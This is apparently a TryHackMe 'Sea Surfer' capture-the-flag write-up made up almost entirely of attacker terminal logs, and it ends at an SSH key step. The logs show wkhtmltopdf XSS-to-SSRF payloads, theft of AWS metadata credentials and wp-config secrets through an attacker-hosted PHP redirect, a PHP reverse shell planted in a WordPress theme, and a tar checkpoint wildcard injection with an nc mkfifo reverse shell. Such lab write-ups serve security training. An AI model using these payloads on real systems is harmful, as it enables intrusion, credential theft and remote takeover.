# Sea Surfer — Writeup

## Overview
### Sea Surfer — Writeup
### Sea Surfer — Writeup
----
Ride the Wave!
----
![](https://i.imgur.com/yvuFbNQ.jpeg)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/137a8e8a8cdc4ba577b8f841b1d5293b.png)
Start Machine
It's a beautiful day to hit the beach and do some surfing.
_Please allow up to 5 minutes for the machine to boot up._
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.74.111 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.74.111:22
Open 10.10.74.111:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.74.111 [2 ports]
Discovered open port 22/tcp on 10.10.74.111
Discovered open port 80/tcp on 10.10.74.111
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.74.111
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.74.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.74.111
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87e3d432cd51d29670ef5f482250ab67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyQtbtTbXITp+A3lHCXTmOYEd3nuF2kZuQ02sjsxLFIE31lelQ+yZMOCwzcC/MohqAcs2LLmfdVi2TJfuOVC0dZ6bkMUdbeF65UtptaUClLuxhdtMkZNxJlAgQSx8d0p3H+JnAmTD5CVeU/x0RlTKRzQDiynKtszcrWjWzZ6DGM7rWjTtGcYOaFObWN66bKrZtQOQw2Fp6LX5aNIqAoxhb3orPKjFUUlcdVzaesX2KBbJsNBDiEF3gGtoK6nJzi9L+NMFAK2Rl06G6vBqxYUc6PKL0M+ovoCEtxeZsH9/R2WqWZ3vB2B8PzqafYFP3chMMcdewG89CCdxmyyFuyGt/kf7L7OLJTWsYiJvLUPFAEyymn4GcfzIcOl/XXVr1hIoTOCDukS0dMWdAvnaaZOMharud9fowd+eAG3LowJnyu2O2OBg6pdpdQzuW9DFmy7etBIlbaSvG+l/8pmgJ3RWSLXDQEl5kZDGXLM6A3qcUqtSOK7ww9IvN8IYxlhyQ0kk=
|   256 27d137b0c53cb5816a7c368a2b639ab9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEhRgdpnS6QXS+haDKzUdKS0IP+HZz749jjQOx9ECJ+ypGOT6Q65NUeHaU49cqARe4kKi9/+Yl/W3U2J4wJKgBw=
|   256 7f131bcfe64551b909439a232f503c94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIZ39ZNVX7VJgmO8M/Vhb9lm35it42Ho7crlLqYhVhAT
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 10.10.74.111 -I
HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:30:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts                                                  
10.10.74.111 seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u seasurfer.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.seasurfer.thm" --hc 404 --hw 964
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://seasurfer.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000387:   200        108 L    275 W      3072 Ch     "internal"  

or http://seasurfer.thm/news/

dude what was the site again where u could create receipts for customers? the computer is saying cant connect to intrenal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.74.111 seasurfer.thm internal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://seasurfer.thm/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seasurfer.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://seasurfer.thm/0000                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/0000/]
http://seasurfer.thm/.htaccess            (Status: 403) [Size: 278]
http://seasurfer.thm/.htpasswd            (Status: 403) [Size: 278]
http://seasurfer.thm/!                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/0                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/About                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/A                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/Blog                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Blog/]
http://seasurfer.thm/B                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/blog/]
http://seasurfer.thm/C                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/contact/]
http://seasurfer.thm/Contact              (Status: 301) [Size: 0] [--> http://seasurfer.thm/Contact/]
http://seasurfer.thm/H                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/home/]
http://seasurfer.thm/Home                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Home/]
http://seasurfer.thm/N                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/new-website-is-up/]
http://seasurfer.thm/News                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/News/]
http://seasurfer.thm/S                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/sale/]
http://seasurfer.thm/a                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/ab                   (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/abo                  (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/about                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/admin                (Status: 302) [Size: 0] [--> http://seasurfer.thm/wp-admin/]
http://seasurfer.thm/adminer              (Status: 301) [Size: 316] [--> http://seasurfer.thm/adminer/]

so http://seasurfer.thm/wp-admin/ to login and http://seasurfer.thm/adminer/ login mysql and pdf generator from subdomain internal

http://internal.seasurfer.thm/invoices/10072023-NMhNcqy3YbDUos3yT96F.pdf

<h1>1337</h1>

<script>document.write(document.location.href)</script>

Additional information: http://internal.seasurfer.thm/invoice.php?
name=a&payment=Credit+card&comment=%3Cscript%3Edocument.write%28document.location.href%29%3C%2Fscript%3E&item1=1&price1
HWjHNv6sJClQVULEFnPb

<img src=x onerror=document.write(navigator.appVersion)>
5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34

<img src=x onerror=document.write(1337)>

let's download the pdf

┌──(witty㉿kali)-[~]
└─$ pdfinfo 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf 
Title:           Receipt
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
CreationDate:    Mon Jul 10 18:51:40 2023 EDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595 x 842 pts (A4)
Page rot:        0
File size:       53159 bytes
Optimized:       no
PDF version:     1.4

or

┌──(witty㉿kali)-[~]
└─$ exiftool 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf                  
ExifTool Version Number         : 12.57
File Name                       : 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf
Directory                       : .
File Size                       : 53 kB
File Modification Date/Time     : 2023:07:10 18:52:26-04:00
File Access Date/Time           : 2023:07:10 18:52:41-04:00
File Inode Change Date/Time     : 2023:07:10 18:52:26-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2023:07:10 22:51:40Z
Page Count                      : 1

<iframe src="http://10.8.19.103:4444/> 

└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 55078
GET /%3E%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=a&payment=Credit+card&comment=%3Ciframe+src%3D%22http%3A%2F%2F10.8.19.103%3A4444%2F%3E+&item1=1&price1=1&id=10072023-kfEf4vxgqjpZF2Fylfn8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.8.19.103:4444

wkhtmltopdf

`XSS` to `SSRF` to `LFI`

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
<iframe src="file:///etc/passwd"> not work

[AWS Capture the Flag Write-Up (hey.com)](https://world.hey.com/alois/aws-capture-the-flag-write-up-e64fa089)

<iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">

signature
rsa2048
document
pkcs7

retrieve a `SecretAccessKey`

<iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" height="1000" width="500">

Additional information: {
"Code" : "Success",
"LastUpdated" : "2023-07-10T22:41:40Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIA2YR2KKQMY6K4737Z",
"SecretAccessKey" :
"DRm8wB8nWsTkQx/k025HNLCY6pK3fFT8f703hAz0",
"Token" :
"IQoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMSJHMEUCIEDq8w+SjTssBi9Lh8y+
aefW2/Ylt6gxE0PRiOgsgjFnAiEAzm/E+cnhw+v2hPGct7SdTGam7ZAJgROou
ruioJHXLLkqzwQIsP//////////ARADGgw3Mzk5MzA0Mjg0NDEiDEzm40kY8baCs
e4bJiqjBHep1ziyH3mj/0e1UBaBNc5cKbXsZIo9iAx4/4xwpwrLSjlsKsG8tc6v4
fVpSAlerKI1LbmotzEUizLe1HVSyrcdBbyaUBjgSjII7oq5nG/vBEvd5BtR0Bc/S
zzzHQcEMYsoqaoy6UrjhHzo8jER+Hz5nD6D1bPSZcAASs8uycb5GiiSRccVzk
GmDH562Tpz8hDmurfdyprQ5dvahEeM3C7iXo2GTgNJqMp2HmtF87tKaOFH
OdXGa7qagUOe/tOhawvIpMQ7GuwI5GBSfCqwXgF4FIFTn0X1tjbibHID+zny
WlN7cU/b5lDYXs6rYwqw/Jskg+tpXWI2eaTmxa+Ma8/y7gNXcz7CynoFElgf9
zzvjHNgslkEDLoOQJJVkr4+gisKt+YVYN8KyF6iVF2tpvU1P901YcU6RMyrP2e
KwjYYLLAgO74614aFXYefPZmO5C+3B1fg1K/4dFd+flJJtt9DS/3O9Y/4TIXjH3
3EG1AAzsWk3Vi2a/W3kSzmc4Yj6AfxYh1rby6RqaBFHK8HnHqMRjZLHhBEv
0K23akLGW2kPdgBm2OUHbE0UblbW07hBll0raqUd4/ZGMSmboGFuzrvAFN
oQdmzTEtFwZelgQJLBS2HlvtE57R6Z+TXzSC3Z+448C1Pag63F/km6tR/HD
XTU/IZAe190rIYNCClP0KMiuLNmRQrif4SB2aBXgbiBlvKOHtiQwaZ7rbQ2aAt
OVNrJ1Ew7JGypQY6kwJlGczY6qsnPCdNGVYH3PJmPl+6iSd6SB+RSPbPKSyfJ
BbPFrrWFQe1mMUqolvAZ02SNCdseGZSvNFNR9nTOHElhYfIWMsRd7wZVs
gchJQSytPiTOIA/f8XeUKcEzz0rQg/bzaTVipORkCHVhrBoSPWWxeWyZG3iCN
3B44d75jR0lL+QRhLtgbAEIKENlupHr3D8zlHTimB1d1Gdaj9J5PUFOtEbFEm
P4Z4LJh/I+txRt9fQ59TbeHbGGZz6nYd+oAhZjTPEfHIjtINV1FW+De6dEHJKZ
CJmnD9jc69baI+yFk/hgEheoVZuVBb8msJJbGaK16Wh/8XbfenTyTa3i85bZ5
9/J+KiD0dkx9DEYcKWAH7IA==",
"Expiration" : "2023-07-11T04:42:19Z"
}

[Write-up for Gemini Inc: 1 - My Learning Journey (kongwenbin.com)](https://kongwenbin.com/write-up-for-gemini-inc-1/)

┌──(witty㉿kali)-[~]
└─$ cat exfiltrate.php  
<?php header('location:file://'.$_REQUEST['x']); ?>

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/etc/passwd"></iframe>

Additional information:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 Accepted
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 [302]: GET /exfiltrate.php?x=/etc/passwd

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/var/www/wordpress/wp-config.php"></iframe>

Additional information:
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the installation.
* You don't have to use the web site, you can copy this file to "wp-config.php"
* and fill in the values.
*
* This file contains the following configurations:
*
* * Database settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://wordpress.org/support/article/editing-wp-config-php/
*
* @package WordPress
*/
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wordpressuser' );
/** Database password */
define( 'DB_PASSWORD', 'coolDataTablesMan' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
* Authentication unique keys and salts.
*
* Change these to different unique phrases! You can generate these using
* the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
*
* You can change these at any point in time to invalidate all existing cookies.
* This will force all users to have to log in again.
*
* @since 2.6.0

* @since 2.6.0
*/
define('AUTH_KEY', 'SFP(>4};J1<~uW@#Z0~&5eJB@{gEzk2(DE_|k1d/B,b*cZLQu0avhmF^!}u| Mv^');
define('SECURE_AUTH_KEY', '-Z;O^-p6f2S+RWT9`5YT8oh),A5)P]Z9V1g!}*s|OLn@LaTWQd:7(?VPQ38<bK@o');
define('LOGGED_IN_KEY', '-6g}oyB ]-*IhO<:ln2Hd^K`Tf.kJlbDs$rx6+2cF?x|$~`XyKZANE)EG^Xy2-#6');
define('NONCE_KEY', '-*847+C`JbNW5:upCc,#pTjgBxS?H-vI{oG@4Xt.AANh|GuJ0nk/8>7fPHj%-;-f');
define('AUTH_SALT', '4cF?fB2,eGo0]-XiMh-@u`8t|p$YAi@=:}!z<TTF%|Hd#miHV{3{d7!!.1y:WIfE');
define('SECURE_AUTH_SALT', 't&gahvY+N^--}nk( ]3-@}6%NesVZ%!Q<D8E>1~UE-|;C,(vGbl)q>u$lBcx:-T/');
define('LOGGED_IN_SALT', '>k$)D6(!K5H&~+GT~UR)0z?4XVOo<G8G)-J!a~U|fHDyd-8.OLJPcFSR2>X+*eU!');
define('NONCE_SALT', '1Et3q-e44k.NN-U=SEpNnJA/D%O;Ow}`]U!ysu~Qdw6d?CmQw*N2;]W.J-89-@a]');
/**#@-*/
/**
* WordPress database table prefix.
*
* You can have multiple installations in one database if you give each
* a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix = 'wp_';
/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*
* For information on other constants that can be used for debugging,
* visit the documentation.
*
* @link https://wordpress.org/support/article/debugging-in-wordpress/
*/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', __DIR__ . '/' );
}
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

then login in /adminer

http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress

http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress&select=wp_users

kyle : $P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/

┌──(witty㉿kali)-[~]
└─$ cat hash_seasurfer 
$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/

or just change it :)

┌──(witty㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_seasurfer
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jenny4ever       (?)     
1g 0:00:00:50 DONE () 0.01980g/s 9930p/s 9930c/s 9930C/s jenny777..jello33
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

login

http://seasurfer.thm/wp-admin/?admin_email_remind_later=1

http://seasurfer.thm/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen 

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php                                           
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://seasurfer.thm/wp-content/themes/twentyseventeen/404.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34810
SOCKET: Shell has connected! PID: 51185
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

or

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34812
SOCKET: Shell has connected! PID: 51218
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
```
```text
# Press Ctrl+Z

stty raw -echo; fg; reset;

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ cd /var/www/internal/maintenance
cd /var/www/internal/maintenance
www-data@seasurfer:/var/www/internal/maintenance$ ls
ls
backup.sh
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
cat backup.sh
#!/bin/bash
```
```text
# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
```

## Exploitation
```text
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
www-data@seasurfer:/var/www/internal/maintenance$ cd /var/www/internal/invoices
cd /var/www/internal/invoices
www-data@seasurfer:/var/www/internal/invoices$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
www-data@seasurfer:/var/www/internal/invoices$ echo ""> "--checkpoint-action=exec=sh shell.sh"
echo ""> "--checkpoint-action=exec=sh shell.sh"
www-data@seasurfer:/var/www/internal/invoices$ echo ""> --checkpoint=1
echo ""> --checkpoint=1
www-data@seasurfer:/var/www/internal/invoices$ ls
ls
'--checkpoint-action=exec=sh shell.sh'	 10072023-HWjHNv6sJClQVULEFnPb.pdf   10072023-RvZI9uENduweGWtPHu6v.pdf	 10072023-f0614GT3xZCekK4yZRAJ.pdf   18042022-x7nvKzdxwDPtGvg3hexH.pdf
'--checkpoint=1'			 10072023-HsCTh0PqnMd9rOLH4WGP.pdf   10072023-T3d9gJ27G3JZVqewFHQB.pdf	 10072023-f4PnrVl2qvcUaSRl2Frs.pdf   19042022-P8SghZ3qVclByyfsSm4c.pdf
 10072023-4Ba5J6QLzHl4dQrhvoIy.pdf	 10072023-Ixe4izWo5Dgetf8bz8wo.pdf   10072023-TL7NzzolfMeW81zTHPD4.pdf	 10072023-kfEf4vxgqjpZF2Fylfn8.pdf   19042022-RuQkG8SZaxQc6vyw7BCv.pdf
 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf	 10072023-MQHDq0QTwIgCF48HJuJX.pdf   10072023-X1J9ntPNub9iUXKREqC6.pdf	 18042022-SZEAfjkefOWOLzNG0nBF.pdf   22042022-NNod4XQ0usiYmPZOVASm.pdf
 10072023-6JNx7UZRbtFUmCAz6rrQ.pdf	 10072023-NMhNcqy3YbDUos3yT96F.pdf   10072023-cyuRo7ZJUUMKPPw4yZQb.pdf	 18042022-lUIvPaOVZIJQarZO7wHP.pdf   shell.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 52658
sh: 0: can't access tty; job control turned off
```
```text
$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
kyle@seasurfer:/var/www/internal/invoices$ 
zsh: suspended  rlwrap nc -lvp 1338
                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ stty raw -echo; fg; reset;
[1]  + continued  rlwrap nc -lvp 1338

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

kyle@seasurfer:/var/www/internal/invoices$ cd /home
cd /home
kyle@seasurfer:/home$ ls
ls
kyle
kyle@seasurfer:/home$ cd kyle
cd kyle
kyle@seasurfer:~$ ls
ls
backups  snap  user.txt
kyle@seasurfer:~$ cat user.txt
cat user.txt
THM{SSRFING_TO_LFI_TO_RCE}

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir seasurfer              
                                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd seasurfer  

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/witty/.ssh/id_rsa): /home/witty/Downloads/seasurfer/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/witty/Downloads/seasurfer/id_rsa
Your public key has been saved in /home/witty/Downloads/seasurfer/id_rsa.pub
The key fingerprint is:
SHA256:xpdT+HtUeOi3dc4icYa652WE8bkRRs2FVOve28p98tA witty@kali
The key's randomart image is:
+---[RSA 3072]----+
|             .o=+|
|           . ..o+|
|          . o =.o|
|       .   + B.= |
|        S + = X.+|
|       . . o B.B=|
|          . o BoE|
|           ..*.++|
|          .o. o==|
+----[SHA256]-----+

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ cat id_rsa.pub 
